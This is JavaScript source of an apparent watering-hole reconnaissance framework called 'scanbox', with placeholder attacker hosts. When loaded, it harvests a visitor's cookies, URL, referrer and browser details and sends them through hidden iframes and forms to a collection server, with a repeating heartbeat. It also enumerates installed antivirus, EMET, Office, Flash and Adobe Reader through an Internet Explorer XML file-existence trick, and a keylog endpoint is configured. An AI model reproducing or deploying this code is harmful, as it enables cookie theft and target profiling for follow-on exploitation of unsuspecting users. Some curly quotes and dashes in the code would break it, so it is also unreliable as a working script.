function setCookie(id,value,bool)
{
    d=new Date();
    if(bool==1)
    {
        d.setTime(d.getTime()+365*10*24*60*60*1000);
    }
    else
    {
        d.setTime(d.getTime()-365*10*24*60*60*1000);
    }
    document.cookie = id+"="+value+";path=/;expires="+d.toGMTString();
}

function getCookie(name)    
{
var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
if(arr != null) return unescape(arr[2]); return -1;

}

function setRecordid()
{
d=new Date();
var time=d.getTime().toString();
var random=(Math.random()*10000000000).toString().substring(0,4);
var seed=parseInt(random+time);
setCookie("recordid",seed,0);
setCookie("recordid",seed,1);
return seed;

}

var scanbox={};
var plugin_return={};

scanbox.basicposturl="http://{SITE}/recv.php";
    scanbox.basicliveurl="http://{SITE}/s.php";
    scanbox.basicplguinurl="http://{SITE}/p.php";
    scanbox.basicposturlkeylogs="http://{SITE}/k.php";
    scanbox.info = {};
    scanbox.info.projectid="9";
    scanbox.info.seed=setRecordid();
    scanbox.info.ip = "{IP}";
    scanbox.info.referrer = document.referrer;
    scanbox.info.agent = navigator.userAgent;
    scanbox.info.location = window.location.href;
    scanbox.info.toplocation = top.location.href;
    scanbox.info.cookie = document.cookie;
    scanbox.info.title = document.title;
    scanbox.info.domain = document.domain;
    scanbox.info.charset = document.characterSet ? document.characterSet: document.charset;
    scanbox.info.screen = function()
    {
        var c = "";
        if (self.screen)
        {
            c = screen.width + "x" + screen.height;
        }
        return c;
    } ();
    scanbox.info.platform = navigator.platform;

    if (window.ActiveXObject)
    {
        scanbox.info.lang = navigator.systemLanguage;
    } else
    {
        scanbox.info.lang = navigator.language;

    }

    plugin_return.ip=scanbox.info.ip;
    plugin_return.referrer=scanbox.info.referrer;
    plugin_return.agent=scanbox.info.agent;
    plugin_return.location=scanbox.info.location;
    plugin_return.toplocation=scanbox.info.toplocation;
    plugin_return.cookie=scanbox.info.cookie;
    plugin_return.title=scanbox.info.title;
    plugin_return.domain=scanbox.info.domain;
    plugin_return.charset=scanbox.info.charset;
    plugin_return.screen=scanbox.info.screen;
    plugin_return.platform=scanbox.info.platform;
    plugin_return.lang=scanbox.info.lang;

    var data="";
    for(x in scanbox.info)
    {
        data+=x+" "+scanbox.info[x]+"\r\n";
    }

    scanbox.random = function(a)
    {
        return ((!a) ? ‘x-‘: a) + Math.floor(Math.random() * 99999);
    };
    scanbox.iframe = function(a, b, c)
    {
        var o = document.createElement("iframe");
        if (a) o.src = a;
        o.width = o.height = 0;
        o.id = b ? b: "__iframe";
        if (c) o.onload = c;
        document.getElementsByTagName("head")[0].appendChild(o);
        return o;
    }

    scanbox.get=function(o)
    {

        var random=scanbox.random();
        var url=o.url;
        var dataarr = o.data;
        var data="";
        var temp=new Array();
        for(x in dataarr)
        {
            temp.push(x+"="+scanbox.crypt.encode(dataarr[x]));
        }
        temp=temp.join("&");
        url=url+"?"+temp;
        var img=new Image();
        img.src=url;

    }

    scanbox.post = function(o)
    {

        var random=scanbox.random();
        try
        {
            iframe_tag = document.createElement(unescape("%3Ciframe%20id%3D"+random+"%20name%3D"+random+"%20style%3Ddisplay%3Anone%3E"));
            document.getElementsByTagName(‘head’).item(0).appendChild(iframe_tag);
            var form_tag = document.createElement("form");
            form_tag.target=random;
            form_tag.method="POST";
            form_tag.action = o.url;
            document.getElementsByTagName(‘head’).item(0).appendChild(form_tag);
            var dataarr = o.data;   
            for(x in dataarr)
            {
                var i = document.createElement("input");
                i.type = "hidden";
                i.name = x;
                i.value = scanbox.crypt.encode(dataarr[x]);
                form_tag.appendChild(i);
            }
            form_tag.submit();
        }
        catch(e)
        {
            iframe_tag = document.createElement(‘iframe’);
            iframe_tag.id=random;
            iframe_tag.setAttribute("name", random);
            iframe_tag.setAttribute("width", "0");
            iframe_tag.setAttribute("height", "0");
            document.getElementsByTagName(‘head’)[0].appendChild(iframe_tag);
            var form_tag = document.createElement("form");
            form_tag.setAttribute("target", random);
            form_tag.setAttribute("action" ,o.url);
            form_tag.setAttribute("method" ,"POST");
            document.getElementsByTagName(‘head’)[0].appendChild(form_tag);
            var dataarr = o.data;   
            for(x in dataarr)
            {
                var i = document.createElement("input");
                i.setAttribute("type","hidden");
                i.setAttribute("name",x);
                i.setAttribute("value",scanbox.crypt.encode(dataarr[x]));
                form_tag.appendChild(i);
            }
            form_tag.submit();
        }
    }

    scanbox.htmlencode=function(o)
    {
        o=o.replace(/&/g,’&amp;’).replace(/\"/g,’&quot;’).replace(/</g,’&lt;’).replace(/>/g,’&gt;’);
        return o;
    }
    scanbox.crypt =
        {
            _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            encode : function (input) {
                var output = "";
                var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
                var i = 0;
                input = scanbox.crypt._utf8_encode(input);
                while (i < input.length) {
                    chr1 = input.charCodeAt(i++);
                    chr2 = input.charCodeAt(i++);
                    chr3 = input.charCodeAt(i++);
                    enc1 = chr1 >> 2;
                    enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                    enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                    enc4 = chr3 & 63;
                    if (isNaN(chr2)) {
                        enc3 = enc4 = 64;
                    } else if (isNaN(chr3)) {
                        enc4 = 64;
                    }
                    output = output +
                        this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
                        this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
                }
                return output;
            },

            decode : function (input) {
                var output = "";
                var chr1, chr2, chr3;
                var enc1, enc2, enc3, enc4;
                var i = 0;
                input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
                while (i < input.length) {
                    enc1 = this._keyStr.indexOf(input.charAt(i++));
                    enc2 = this._keyStr.indexOf(input.charAt(i++));
                    enc3 = this._keyStr.indexOf(input.charAt(i++));
                    enc4 = this._keyStr.indexOf(input.charAt(i++));
                    chr1 = (enc1 << 2) | (enc2 >> 4);
                    chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                    chr3 = ((enc3 & 3) << 6) | enc4;
                    output = output + String.fromCharCode(chr1);
                    if (enc3 != 64) {
                        output = output + String.fromCharCode(chr2);
                    }
                    if (enc4 != 64) {
                        output = output + String.fromCharCode(chr3);
                    }
                }
                output = scanbox.crypt._utf8_decode(output);
                return output;
            },
            _utf8_encode : function (string) {
                string=string.toString();
                string = string.replace(/\r\n/g,"\n");
                var utftext = "";
                for (var n = 0; n < string.length; n++) {
                    var c = string.charCodeAt(n);
                    if (c < 128) {
                        utftext += String.fromCharCode(c);
                    }
                    else if((c > 127) && (c < 2048)) {
                        utftext += String.fromCharCode((c >> 6) | 192);
                        utftext += String.fromCharCode((c & 63) | 128);
                    }
                    else {
                        utftext += String.fromCharCode((c >> 12) | 224);
                        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                        utftext += String.fromCharCode((c & 63) | 128);
                    }
                }
                return utftext;
            },
            _utf8_decode : function (utftext) {
                var string = "";
                var i = 0;
                var c = c1 = c2 = 0;
                while ( i < utftext.length ) {
                    c = utftext.charCodeAt(i);
                    if (c < 128) {
                        string += String.fromCharCode(c);
                        i++;
                    }
                    else if((c > 191) && (c < 224)) {
                        c2 = utftext.charCodeAt(i+1);
                        string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                        i += 2;
                    }
                    else {
                        c2 = utftext.charCodeAt(i+1);
                        c3 = utftext.charCodeAt(i+2);
                        string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                        i += 3;
                    }
                }
                return string;
            }
        }
    scanbox.basicpost=function()
    {
        var basic={};
        basic.url=scanbox.basicposturl;
        basic.data=scanbox.info;
        scanbox.post(basic);
    }
    scanbox.hostalive=function()
    {
        var basic={};
        d=new Date();
        var time=d.getTime().toString().substring(0,10);
        basic.url=scanbox.basicliveurl;
        var temp=new Image();
        temp.src=basic.url+"?seed="+scanbox.crypt.encode(scanbox.info.seed)+"&alivetime="+scanbox.crypt.encode(time)+"&r="+Math.random();

    }
    scanbox.basicpost();

    setInterval("scanbox.hostalive();",4000);

    (function(){

        try
        {

            basic={};
            basic.data={};
            plugin_timeout=0;
            basic.url=scanbox.basicplguinurl;
            basic.data.pluginid=1;
            basic.data.projectid=9;
            basic.data.seed=scanbox.info.seed;
            var softwarelist=new Array();
            //software list start<<<

            softwarelist.push("avira==c:\\WINDOWS\\system32\\drivers\\avipbb.sys");
            softwarelist.push("bitdefender_2013==c:\\Program Files\\Bitdefender\\Bitdefender 2013 BETA\\BdProvider.dll");
            softwarelist.push("bitdefender_2013==c:\\Program Files\\Bitdefender\\Bitdefender 2013 BETA\\Active Virus Control\\avc3_000_001\\avcuf32.dll");
            softwarelist.push("mcafee_enterprise==c:\\Program Files\\McAfee\\VirusScan Enterprise\\RES0402\\McShield.dll");
            softwarelist.push("mcafee_enterprise==c:\\Program Files\\Common Files\\McAfee\\SystemCore\\mytilus3.dll");
            softwarelist.push("mcafee_enterprise==c:\\Program Files\\Common Files\\McAfee\\SystemCore\\mytilus3_worker.dll");
            softwarelist.push("avg2012==c:\\Program Files\\AVG Secure Search\\13.2.0.4\\AVG Secure Search_toolbar.dll");
            softwarelist.push("avg2012==c:\\Program Files\\Common Files\\AVG Secure Search\\DNTInstaller\\13.2.0\\avgdttbx.dll");
            softwarelist.push("avg2012==c:\\WINDOWS\\system32\\drivers\\avgtpx86.sys");
            softwarelist.push("eset_nod32==c:\\WINDOWS\\system32\\drivers\\eamon.sys");
            softwarelist.push("Dr.Web==c:\\Program Files\\DrWeb\\drwebsp.dll");
            softwarelist.push("Mse==c:\\WINDOWS\\system32\\drivers\\MpFilter.sys");
            softwarelist.push("sophos==c:\\PROGRA~1\\Sophos\\SOPHOS~1\\SOPHOS~1.DLL");
            softwarelist.push("f-secure2011==c:\\program files\\f-secure\\scanner-interface\\fsgkiapi.dll");
            softwarelist.push("f-secure2011==c:\\Program Files\\F-Secure\\FSPS\\program\\FSLSP.DLL");
            softwarelist.push("f-secure2011==c:\\program files\\f-secure\\hips\\fshook32.dll");
            softwarelist.push("Kaspersky_2012==c:\\Program Files\\Kaspersky Lab\\Kaspersky Anti-Virus 2012\\klwtblc.dll");
            softwarelist.push("Kaspersky_2012==c:\\WINDOWS\\system32\\drivers\\klif.sys");
softwarelist.push("Kaspersky_2013==c:\\Program Files\\Kaspersky Lab\\Kaspersky Anti-Virus 2013\\remote_eka_prague_loader.dll");
softwarelist.push("Kaspersky_2013==c:\\Program Files\\Kaspersky Lab\\Kaspersky Anti-Virus 2013\\klwtblc.dll");
softwarelist.push("Kaspersky_2013==c:\\WINDOWS\\system32\\drivers\\kneps.sys");
softwarelist.push("Kaspersky_2013==c:\\WINDOWS\\system32\\drivers\\klflt.sys");
softwarelist.push("WinRAR==c:\\Program Files\\WinRAR\\WinRAR.exe");
softwarelist.push("iTunes==c:\\Program Files (x86)\\iTunes\\iTunesHelper.exe");
softwarelist.push("iTunes==c:\\Program Files\\iTunes\\iTunesHelper.exe");
softwarelist.push("SQLServer==c:\\Program Files (x86)\\Microsoft SQL Server\\80\\COM\\sqlvdi.dll");
softwarelist.push("SQLServer==c:\\Program Files\\Microsoft SQL Server\\80\\COM\\sqlvdi.dll");
softwarelist.push("SQLServer==c:\\Program Files (x86)\\Microsoft SQL Server\\90\\COM\\instapi.dll");
softwarelist.push("SQLServer==c:\\Program Files\\Microsoft SQL Server\\90\\COM\\instapi.dll");
softwarelist.push("winzip==c:\\Program Files\\WinZip\\WZSHLSTB.DLL");
softwarelist.push("winzip==c:\\Program Files\\WinZip\\ZipSendB.dll");
softwarelist.push("7z==c:\\Program Files (x86)\\7-Zip\\7z.exe");
softwarelist.push("7z==c:\\Program Files\\7-Zip\\7z.exe");
softwarelist.push("vmware-server==c:\\WINDOWS\\system32\\drivers\\vmx86.sys");
softwarelist.push("vmware-server==c:\\WINDOWS\\system32\\drivers\\vmnet.sys");
softwarelist.push("vmware-client==c:\\WINDOWS\\system32\\drivers\\vmxnet.sys");
softwarelist.push("symantec-endpoint==c:\\WINDOWS\\system32\\drivers\\WpsHelper.sys");
softwarelist.push("symantec-endpoint==c:\\WINDOWS\\system32\\drivers\\SYMEVENT.SYS");
softwarelist.push("symantec-endpoint==c:\\Program Files\\Symantec\\Symantec Endpoint Protection\\wpsman.dll");
softwarelist.push("F-Secure==C:\\Program Files\\F-Secure\\ExploitShield\\fsesgui.exe");
softwarelist.push("antiyfx==C:\\Program Files\\agb7pro\\agb.exe");
softwarelist.push("ESTsoft==C:\\Program Files\\ESTsoft\\ALYac\\AYLaunch.exe");
softwarelist.push("ESTsoft==C:\\WINDOWS\\system32\\drivers\\EstRtw.sys");
softwarelist.push("Fortinet==C:\\Program Files\\Fortinet\\FortiClient\\FortiClient.exe");
softwarelist.push("Fortinet==C:\\WINDOWS\\system32\\drivers\\FortiRdr.sys");
softwarelist.push("ViRobot4==C:\\Program Files\\ViRobotXP\\Vrmonnt.exe");
softwarelist.push("VirusBuster==C:\\Program Files\\VirusBuster\\winpers.exe");
softwarelist.push("VirusBuster==C:\\WINDOWS\\system32\\drivers\\vbengnt.sys");
softwarelist.push("COMODO==C:\\WINDOWS\\system32\\drivers\\cmderd.sys");
softwarelist.push("a-squared==C:\\Program Files\\a-squared Anti-Malware\\a2cmd.exe");
softwarelist.push("IKARUS==C:\\Program Files\\IKARUS\\anti.virus\\unGuardX.exe");
softwarelist.push("sophos==C:\\WINDOWS\\system32\\drivers\\SophosBootDriver.sys");
softwarelist.push("sophos==C:\\Program Files\\Sophos\\Sophos Anti-Virus\\SavMain.exe");
softwarelist.push("Nprotect==C:\\Program Files\\INCAInternet\\nProtect Anti-Virus Spyware 3.0\\nsphsvr.exe");
softwarelist.push("Trend2013==C:\\Program Files\\Trend Micro\\Titanium\\UIFramework\\uiWinMgr.exe");
softwarelist.push("Trend2013==C:\\WINDOWS\\system32\\drivers\\tmtdi.sys");
softwarelist.push("Norton==C:\\Program Files\\Norton Internet Security\\Branding\\muis.dll");
softwarelist.push("Norton==C:\\WINDOWS\\system32\\drivers\\SYMEVENT.SYS");
softwarelist.push("Outpost==C:\\Program Files\\Agnitum\\Outpost Security Suite Pro\\acs.exe");
softwarelist.push("Outpost==C:\\WINDOWS\\system32\\drivers\\afwcore.sys");
softwarelist.push("AhnLab_V3==C:\\Program Files\\AhnLab\\V3IS80\\V3Main.exe");
softwarelist.push("F-PROT==C:\\Program Files\\FRISK Software\\F-PROT Antivirus for Windows\\FPWin.exe");
softwarelist.push("F-PROT==C:\\WINDOWS\\system32\\drivers\\FStopW.sys");
softwarelist.push("ESET-SMART==C:\\Program Files\\ESET\\ESET Smart Security\\egui.exe");
softwarelist.push("ESET-SMART==C:\\WINDOWS\\system32\\drivers\\eamon.sys");
softwarelist.push("Kaspersky_Endpoint_Security_8==C:\\Program Files\\Kaspersky Lab\\Kaspersky Endpoint Security 8 for Windows\\avp.exe");
softwarelist.push("Norman==C:\\Program Files\\Norman\\Nse\\Bin\\nse.exe");
softwarelist.push("Norman==C:\\WINDOWS\\system32\\drivers\\nvcw32mf.sys");
softwarelist.push("Sunbelt==C:\\Program Files\\Sunbelt Software\\Personal Firewall\\cfgconv.exe");
softwarelist.push("QuickHeal==C:\\Program Files\\Quick Heal\\Quick Heal Total Security\\ARKIT.EXE");
softwarelist.push("QuickHeal==C:\\WINDOWS\\system32\\drivers\\catflt.sys");
softwarelist.push("Immunet==C:\\Program Files\\Immunet\\ips.exe");
softwarelist.push("Immunet==C:\\WINDOWS\\system32\\drivers\\ImmunetProtect.sys");
softwarelist.push("JiangMin==C:\\Program Files\\JiangMin\\AntiVirus\\KVPopup.exe");
softwarelist.push("JiangMin==C:\\WINDOWS\\system32\\drivers\\SysGuard.sys");
softwarelist.push("PC_Tools==C:\\Program Files\\PC Tools Antivirus Software\\pctsGui.exe");
softwarelist.push("Rising_firewall==C:\\Program Files\\Rising\\RFW\\RavMonD.exe");
softwarelist.push("Rising_firewall==C:\\WINDOWS\\system32\\drivers\\protreg.sys");
softwarelist.push("BkavHome==C:\\Program Files\\BkavHome\\Bka.exe");
softwarelist.push("BkavHome==C:\\WINDOWS\\system32\\drivers\\BkavAuto.sys");
softwarelist.push("SUPERAntiSpyware==C:\\Program Files\\SUPERAntiSpyware\\SUPERAntiSpyware.exe");
softwarelist.push("Rising==C:\\Program Files\\Rising\\RIS\\LangSel.exe");
softwarelist.push("Rising==C:\\WINDOWS\\system32\\drivers\\HookHelp.sys");
softwarelist.push("Symantec_Endpoint12==C:\\Program Files\\Symantec\\Symantec Endpoint Protection\\DoScan.exe");
softwarelist.push("eScan==C:\\Program Files\\eScan\\shortcut.exe");
softwarelist.push("eScan==C:\\WINDOWS\\system32\\drivers\\econceal.sys");
softwarelist.push("Bit9==C:\\Windows\\System32\\drivers\\Parity.sys");
softwarelist.push("emet4.1==C:\\Program Files (x86)\\EMET 4.1\\EMET.dll");
softwarelist.push("emet4.1==C:\\Program Files\\EMET 4.1\\EMET.dll");
softwarelist.push("emet4.1==d:\\Program Files\\EMET 4.1\\EMET.dll");
softwarelist.push("emet4.1==D:\\Program Files (x86)\\EMET 4.1\\EMET.dll");
softwarelist.push("emet5.0==C:\\Program Files (x86)\\EMET 5.0\\EMET.dll");
softwarelist.push("emet5.0==C:\\Program Files\\EMET 5.0\\EMET.dll");
softwarelist.push("emet5.0==d:\\Program Files (x86)\\EMET 5.0\\EMET.dll");
softwarelist.push("emet5.0==d:\\Program FilesEMET 5.0\\EMET.dll");

//software list end.

var templateString = "<"+"?xml version=\"1.0\" ?><\!DOCTYPE anything SYSTEM \"$target$\">";
var _debug = false;
var RESULTS =
{
  UNKNOWN : {value: 0, message: "Unknown!", color: "black", data: ""},
  BADBROWSER: {value: 1, message: "Browser is not supported. You need IE!", color: "black", data: ""},
  FILEFOUND : {value: 2, message: "File was found!", color: "green", data: ""},
  FOLDERFOUND : {value: 3, message: "Folder was found!", color: "green", data: ""},
  NOTFOUND : {value: 4, message: "Object was not found!", color: "red", data: ""},
  ALIVE : {value: 5, message: "Alive address!", color: "green", data: ""},
  MAYBEALIVE : {value: 6, message: "Maybe an alive address!", color: "blue", data: ""},
  DEAD : {value: 7, message: "Dead to me! Undetectable?", color: "red", data: ""},
  VALIDDRIVE : {value: 8, message: "Available Drive!", color: "green", data: ""},
  INVALIDDRIVE : {value: 9, message: "Unavailable Drive!", color: "red", data: ""}
};

function checkFiles()
{
    var datares=new Array();
    strInput=softwarelist;
    var name=new Array();
    var files=new Array();
    for(i=0;i<strInput.length;i++)
    {
        if(strInput[i]!="")
        {
            var temp=strInput[i].split("==");
            name.push(temp[0]);
            files.push(temp[1]);
        }
    }
    var preMagics = ["res://","\\\\localhost\\", "file:\\\\localhost\\", "file:\\"];
    var postMagics = ["::$index_allocation"];
    for (j=0;j<files.length;j++)
    {
        var item=files[j];
        var filename = item.fulltrim();
        if (filename != "")
        {
            filename = preMagics[0] + filename;
            var result = validateXML(templateString.replace("$target$", filename));
            if (result == RESULTS.FOLDERFOUND || result == RESULTS.ALIVE)
            result = RESULTS.UNKNOWN;
            result.data = filename;
            if(result.value==2)
            {
                datares.push(name[j]);
            }
        }
    }
    return datares;
}
if (typeof String.prototype.fulltrim !== "function")
{
    String.prototype.fulltrim = function ()
    {
        return this.replace(/(?:(?:^|\n)\s+|\s+(?:$|\n))/g, "").replace(/\s+/g, " ");
    };
};

function validateXML(txt, _isDebugMode)
{
    var result = RESULTS.UNKNOWN;
    if (window.ActiveXObject)
    {
        var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
        xmlDoc.async = true;
        try
        {
            xmlDoc.loadXML(txt);
            if (xmlDoc.parseError.errorCode != 0)
            {
                var err;
                err = "Error Code: " + xmlDoc.parseError.errorCode + "\n";
                err += "Error Reason: " + xmlDoc.parseError.reason;
                err += "Error Line: " + xmlDoc.parseError.line;
                var errReason = err;

                if(errReason.indexOf("-2147023083")>0)
                {
                    result = RESULTS.FILEFOUND;
                }
            }
        } catch (e)
        {
            result = RESULTS.UNKNOWN;
        }
    } else
    {
        result = RESULTS.UNKNOWN;
    }
    result.data = "";
    return result;
}

Array.prototype.uniquefun = function() {
    var res = [], hash = {};
    for(var i=0, elem; (elem = this[i]) != null; i++)  {
        if (!hash[elem])
        {
            res.push(elem);
            hash[elem] = true;
        }
    }
    return res;
}

var data=(checkFiles());
data=data.uniquefun();
data=data.join(",");
data=data.replace(/,,/g,",");
return_data=data;
plugin_return.softwarescan=data;   

        basic.data.data="No return data!";
        try
        {
            basic.data.data=return_data;
        }
        catch(e)
        {
            basic.data.data="No return data!";
        }
        if(plugin_timeout==0)
        {
            scanbox.post(basic);
        }
        else
        {   
            window.setTimeout(function(){scanbox.post(basic);},plugin_timeout*1000);
        }

    }
    catch(e)
    {}

})();
(function(){

    try
    {

        basic={};
        basic.data={};
        plugin_timeout=0;
        basic.url=scanbox.basicplguinurl;
        basic.data.pluginid=3;
        basic.data.projectid=9;
        basic.data.seed=scanbox.info.seed;
        function flashver()
        {
        var flash = function () {};
        flash.prototype.controlVersion = function () {
            var version;
            var axo;
            var e;
            try {
                axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
                version = axo.GetVariable("$version")
            } catch (e) {}

            if (!version) {
                try {
                    axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
                    version = "WIN 6,0,21,0";
                    axo.AllowScriptAccess = "always";
                    version = axo.GetVariable("$version")
                } catch (e) {}

            }
            if (!version) {
                try {
                    axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
                    version = axo.GetVariable("$version")
                } catch (e) {}

            }
            if (!version) {
                try {
                    axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
                    version = "WIN 3,0,18,0"
                } catch (e) {}

            }
            if (!version) {
                try {
                    axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
                    version = "WIN 2,0,0,11"
                } catch (e) {
                    version = -1
                }
            }
            var verArr = version.toString().split(",");
            var str = "";
            for (var i = 0, l = verArr.length; i < l; i++) {
                if (verArr[i].indexOf("WIN") != -1) {
                    str += verArr[i].substring(3);
                    str += "."
                } else {
                    if (i == (l – 1)) {
                        str += verArr[i]
                    } else {
                        str += verArr[i];
                        str += "."
                    }
                }
            }
            return (str)
        };
        flash.prototype.getSwfVer = function () {
            var isIE = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
            var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
            var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;
            var flashVer = -1;
            if (navigator.plugins != null && navigator.plugins.length > 0) {
                if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
                    var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
                    var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
                    var descArray = flashDescription.split(" ");
                    var tempArrayMajor = descArray[2].split(".");
                    var versionMajor = tempArrayMajor[0];
                    var versionMinor = tempArrayMajor[1];
                    var versionRevision = descArray[3];
                    if (versionRevision == "") {
                        versionRevision = descArray[4]
                    }
                    if (versionRevision[0] == "d") {
                        versionRevision = versionRevision.substring(1)
                    } else {
                        if (versionRevision[0] == "r") {
                            versionRevision = versionRevision.substring(1);
                            if (versionRevision.indexOf("d") > 0) {
                                versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"))
                            }
                        }
                    }
                    var flashVer = versionMajor + "." + versionMinor + "." + versionRevision
                }
            } else {
                if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) {
                    flashVer = 4
                } else {
                    if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) {
                        flashVer = 3
                    } else {
                        if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) {
                            flashVer = 2
                        } else {
                            if (isIE && isWin && !isOpera) {
                                flashVer = new flash().controlVersion()
                            }
                        }
                    }
                }
            }
            return flashVer
        };
        if (flash.prototype.getSwfVer() == -1) {
            return "No Flash!"
        } else {
            return "Shockwave Flash " + flash.prototype.getSwfVer()
        }
}
return_data=flashver();
plugin_return.flashver=flashver();   
        basic.data.data="No return data!";
        try
        {
            basic.data.data=return_data;
        }
        catch(e)
        {
            basic.data.data="No return data!";
        }
        if(plugin_timeout==0)
        {
            scanbox.post(basic);
        }
        else
        {   
            window.setTimeout(function(){scanbox.post(basic);},plugin_timeout*1000);
        }
    }
    catch(e)
    {}
})();
(function(){
    try
    {
        basic={};
        basic.data={};
        plugin_timeout=0;
        basic.url=scanbox.basicplguinurl;
        basic.data.pluginid=5;
        basic.data.projectid=9;
        basic.data.seed=scanbox.info.seed;
        function officever()
        {
            var ma = 1;
            var mb = 1;
            var mc = 1;
            var md = 1;
            try {
                ma = new ActiveXObject("SharePoint.OpenDocuments.4")
            } catch (e) {}

            try {
                mb = new ActiveXObject("SharePoint.OpenDocuments.3")
            } catch (e) {}

            try {
                mc = new ActiveXObject("SharePoint.OpenDocuments.2")
            } catch (e) {}

            try {
                md = new ActiveXObject("SharePoint.OpenDocuments.1")
            } catch (e) {}

            var a = typeof ma;
            var b = typeof mb;
            var c = typeof mc;
            var d = typeof md;
            var key = "";
            if (a == "object" && b == "object" && c == "object" && d == "object") {
                key = "Office 2010"
            }
            if (a == "number" && b == "object" && c == "object" && d == "object") {
                key = "Office 2007"
            }
            if (a == "number" && b == "number" && c == "object" && d == "object") {
                key = "Office 2003"
            }
            if (a == "number" && b == "number" && c == "number" && d == "object") {
                key = "Office Xp"
            }
            return key
        }
        return_data=officever();
        plugin_return.officever=officever();   

        basic.data.data="No return data!";
        try
        {
            basic.data.data=return_data;
        }
        catch(e)
        {
            basic.data.data="No return data!";
        }
        if(plugin_timeout==0)
        {
            scanbox.post(basic);
        }
        else
        {   
            window.setTimeout(function(){scanbox.post(basic);},plugin_timeout*1000);
        }
    }
    catch(e)
    {}

})();
(function(){
    try
    {
        basic={};
        basic.data={};
        plugin_timeout=0;
        basic.url=scanbox.basicplguinurl;
        basic.data.pluginid=6;
        basic.data.projectid=9;
        basic.data.seed=scanbox.info.seed;
        function plugin_pdf_ie()
        {
            var ma=1;
            var key="";
            try{ma=new ActiveXObject("AcroPDF.PDF");}catch(e){};
            var a=typeof ma;
            if(a=="object"){key="Adobe Reader";}
            return key;
        }
        return_data=plugin_pdf_ie();
        plugin_return.pdfie=plugin_pdf_ie();   
        basic.data.data="No return data!";
        try
        {
            basic.data.data=return_data;
        }
        catch(e)
        {
            basic.data.data="No return data!";
        }
        if(plugin_timeout==0)
        {
            scanbox.post(basic);
        }
        else
        {   
            window.setTimeout(function(){scanbox.post(basic);},plugin_timeout*1000);
        }
    }
    catch(e)
    {}
})();
